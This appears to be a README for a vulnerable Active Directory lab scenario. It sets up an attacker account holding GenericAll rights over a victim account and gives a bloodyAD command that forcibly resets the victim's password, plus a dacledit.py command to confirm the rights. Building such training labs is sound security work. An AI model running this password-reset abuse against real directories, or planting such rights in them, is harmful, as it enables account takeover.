# acl-genericall-user

User with GenericAll on another user. Creates `scn-acl-gau-attacker` (password `Aa1234567890!`) and the user `scn-acl-gau-victim`, and gives the attacker `GenericAll` (inheritance `None`) on it.

Attack:

    bloodyAD -d <domain> -u scn-acl-gau-attacker -p 'Aa1234567890!' --host <dc ip> set password scn-acl-gau-victim 'NewPassw0rd!'

How to verify:

    dacledit.py -action read -principal scn-acl-gau-attacker -target scn-acl-gau-victim <domain>/scn-acl-gau-attacker:'Aa1234567890!' -dc-ip <dc ip>   # shows FullControl

Disable deletes both objects (the ACE goes with the target).
